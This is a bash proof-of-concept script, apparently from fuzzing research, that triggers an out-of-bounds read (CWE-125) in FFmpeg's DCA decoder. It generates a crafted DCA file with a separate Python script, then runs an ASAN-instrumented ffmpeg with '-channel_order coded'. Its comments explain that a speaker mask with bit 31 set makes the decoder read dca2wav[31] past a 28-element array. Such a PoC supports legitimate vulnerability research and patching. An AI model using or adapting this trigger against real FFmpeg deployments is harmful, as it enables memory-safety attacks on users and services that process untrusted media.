#!/usr/bin/env bash
# vuln_001_run.sh – Run the VULN 001 PoC for OOB read on dca2wav[] in FFmpeg
# Target: ff_dca_set_channel_layout() / ff_dca_export_downmix_matrix() in dcadec.c
# CWE-125: Out-of-Bounds Read

set -euo pipefail

SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
FFMPEG_BIN="/data/ylwang/non-textfuzz/target/FFmpeg/build_test/ffmpeg"
INPUT_DCA="${SCRIPT_DIR}/vuln_001_input.dca"
OUTPUT_NULL="/dev/null"

# ASAN options
export ASAN_OPTIONS="detect_oob_errors=1:halt_on_error=0:exitcode=42:log_path=/tmp/asan_vuln001"

# ---- Step 1: Generate the crafted DCA file ----
echo "[*] Generating crafted DCA input..."
python3 "${SCRIPT_DIR}/vuln_001_gen.py"
echo "[+] Input: ${INPUT_DCA}"

# ---- Step 2: Run FFmpeg – default channel order (may surface mapping errors) ----
echo ""
echo "[*] Run 1: default channel order (force DTS/DCA demuxer)"
"${FFMPEG_BIN}" -nostdin -loglevel debug \
    -f dts -i "${INPUT_DCA}" \
    -f null "${OUTPUT_NULL}" 2>&1 || true

# ---- Step 3: Run FFmpeg – coded channel order (triggers dca2wav[] OOB read) ----
# With -channel_order coded, ff_dca_set_channel_layout() iterates
# dca_ch from 0 to DCA_SPEAKER_COUNT-1 (=31) and accesses dca2wav[dca_ch]
# for each set bit in dca_mask.  When bit 31 is set (xxch_spkr_mask=0x80000000),
# dca2wav[31] is read, but the array only has 28 elements → OOB read.
echo ""
echo "[*] Run 2: -channel_order coded  (targets dca2wav[31] OOB)"
"${FFMPEG_BIN}" -nostdin -loglevel debug \
    -channel_order coded \
    -f dts -i "${INPUT_DCA}" \
    -f null "${OUTPUT_NULL}" 2>&1 || true

echo ""
echo "[*] Done."
